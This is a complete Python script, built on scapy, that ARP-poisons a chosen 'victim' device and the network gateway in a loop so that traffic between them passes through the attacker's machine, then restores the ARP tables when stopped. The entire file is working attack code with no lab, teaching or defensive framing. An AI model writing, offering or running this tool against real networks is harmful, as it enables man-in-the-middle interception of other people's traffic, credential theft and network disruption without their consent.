#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import time
import sys

def argumentParse():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="IP address of the victim computer or device")
    parser.add_argument("-r", "--router", dest="gateway", help="Gateway address of the network")
    options = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please provide an IP address for the target. Use -h for more information.")
    if not options.gateway:
        parser.error("[-] Please provide the gateway address of the network.")

    return options


def scan_network(ip_range):
    """
    Scan the network for devices given an IP address or range.
    """
    arp_header = scapy.ARP(pdst=ip_range)
    ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = ether_header/arp_header
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, router_gateway):
    """
    Create and send ARP spoofing packets.
    """
    target_mac = scan_network(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_gateway)
    scapy.send(packet, verbose=False)


def restoreARP(destination_ip, source_ip):
    """
    Creating and send ARP packet to restore the ARP connection
    """
    destination_mac = scan_network(destination_ip)
    source_mac = scan_network(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def main():
    options = argumentParse()
    packet_count = 0

    try:
        while True:
            spoof(options.target_ip, options.gateway)
            spoof(options.gateway, options.target_ip)
            packet_count += 2
            print(f"\r[+] Packets sent to {options.target_ip} and {options.gateway} | Packet Count: {packet_count}")

            time.sleep(1.5)
    except KeyboardInterrupt:
        restoreARP(options.target_ip, options.gateway)
        restoreARP(options.gateway, options.target_ip)
        print("\n[+] Stopping ARP spoofing please wait...")
        print("[+] ARP Spoof successfully Restored...")


if __name__ == "__main__":
    main()
